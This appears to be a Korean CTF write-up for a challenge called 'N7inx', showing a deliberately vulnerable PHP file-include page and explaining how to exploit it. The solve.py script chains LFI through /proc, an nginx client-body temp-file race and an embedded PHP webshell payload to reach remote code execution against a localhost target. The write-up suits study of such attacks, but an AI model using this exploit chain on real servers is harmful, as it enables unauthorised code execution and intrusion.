# N7inx

# Usage
- 공란

# Concept
- php7trick
- LFI

# Writeup
### index.php
```php
<?php
function No_wrapper($file) {
    $forbidden = array("/filter/i", "#://#", "/utf/i", "/resource/i", "/convert/i","/iconv/i","php/i");
    if (!is_string($file) || !is_ascii($file)) {
        return false;
    }
    foreach ($forbidden as $pattern) {
        if (preg_match($pattern, $file) === 1) {
            return false;
        }
    }
    return true;
}

function is_ascii($str) {
    return 0 === preg_match('/[^\x20-\x7E]/', $str);
}

if (isset($_GET["what_is php"]) && $_GET["7_version"]) {
    $file = $_GET["what_is php"];
    $version = $_GET["7_version"];
    if (strlen($version)<3 && strlen($version)>1){
        if($version > "74" && $version < 74){
            if (No_wrapper($file) === true) {
                include_once($file);
            } else {
                die("NO HACK!!");
            }
        } 
        else die("wrong!!");

    } else die("wrong!!");
}
else {
highlight_file(__FILE__);
die("I don't know....");
}
?>
```

index.php를 살펴보면 먼저 get인자로 what_is php라는 변수와 7_version라는 변수를 받습니다. 먼저 php변수를 보시면 what_is php라는 변수명에 공백이 있습니다. 
php에서는 변수명에 공백이 있으면 공백을 _로 치환합니다. 그러나 php7에서는 앞에 [가 있으면 공백을 _로 치환하지 않습니다.

그리고 7_version이란 변수는 php7에 느슨한 비교 트릭을 이용했습니다.
what_is php가 일단 get으로 받아야하고 7_version가 조건식에 일치해야 LFI가 터집니다.
그러나 함수부분에서 php wrapper에 페이로드 몇 부분을 필터링을 걸어놓았고 
php session upload도 불가능하게 설정해놓았습니다.  
Nginx는 client body buffering(클라이언트가 보내는 데이터를 일시적으로 저장하는 기능)를 제공합니다. 
클라이언트 본문의 크기(POST로 국한되지 않음)가 임계값보다 크면 임시 파일을 작성하고 
PHP webshell 임의 쓰기 그러나 바로 삭제되지만 Race Condition을 통해 파일에 접근해서 
LFI를 통한 RCE가 가능합니다.



#### solve.py
```py
import  threading, requests


URL = f'http://localhost:9000/'

# find nginx worker processes 
r  = requests.get(URL, params={
    '7_version':"7A",
    'what[is php': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    '7_version':"7A",
    'what[is php': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        '7_version':"7A",
        'what[is php': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()



def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                '7_version':"7A",
                'what[is php': f,
                'c': f'pwd'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```
